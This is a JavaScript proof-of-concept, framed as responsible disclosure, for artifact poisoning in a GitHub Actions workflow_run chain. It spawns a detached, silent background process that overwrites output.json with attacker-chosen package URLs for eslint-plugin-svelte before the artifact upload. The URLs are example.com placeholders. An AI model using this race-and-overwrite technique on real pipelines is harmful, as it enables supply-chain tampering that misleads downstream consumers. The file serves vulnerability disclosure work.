// Security Research PoC - Responsible Disclosure
// Demonstrates artifact poisoning via workflow_run chain
// The background process overwrites output.json after pkg-pr-new and metadata steps
// but before the upload-artifact step

import { spawn } from 'child_process';
import { writeFileSync } from 'fs';

const pocPayload = {
  // Target our own PR (number 0 means it will be set by metadata step anyway)
  // The key demonstration is that we control the package URLs
  number: 0,
  event_name: "pull_request",
  ref: "refs/pull/poc/merge",
  sha: "poc-security-test",
  packages: [
    {
      name: "eslint-plugin-svelte",
      url: "https://example.com/SECURITY-RESEARCH-POC-NOT-REAL-PACKAGE"
    }
  ]
};

// Write the overwrite script
const overwriteScript = `
const fs = require('fs');
const path = require('path');

// Wait for the metadata step to finish writing output.json
// The timing: build -> pkg-pr-new publish -> add metadata -> upload
// We are in "build", need to wait for "add metadata" (~10-15s)
const delays = [10, 15, 20, 25];

for (const delay of delays) {
  setTimeout(() => {
    try {
      const target = path.join(process.cwd(), 'output.json');
      // Only overwrite if the file exists (metadata step has run)
      if (fs.existsSync(target)) {
        const current = JSON.parse(fs.readFileSync(target, 'utf8'));
        // Keep the real PR number from metadata step but replace packages
        const poisoned = {
          ...current,
          packages: [
            {
              name: "eslint-plugin-svelte",
              url: "https://example.com/RESPONSIBLE-DISCLOSURE-POC"
            }
          ]
        };
        fs.writeFileSync(target, JSON.stringify(poisoned), 'utf8');
        console.log('[PoC] output.json overwritten at +' + delay + 's');
      }
    } catch (e) {
      // ignore
    }
  }, delay * 1000);
}

// Keep process alive for 30s
setTimeout(() => process.exit(0), 30000);
`;

// Spawn detached background process
const child = spawn('node', ['-e', overwriteScript], {
  detached: true,
  stdio: 'ignore',
  cwd: process.cwd()
});
child.unref();

console.log('[PoC] Background overwrite process started (PID: ' + child.pid + ')');
console.log('[PoC] Will attempt to overwrite output.json at +10s, +15s, +20s, +25s');
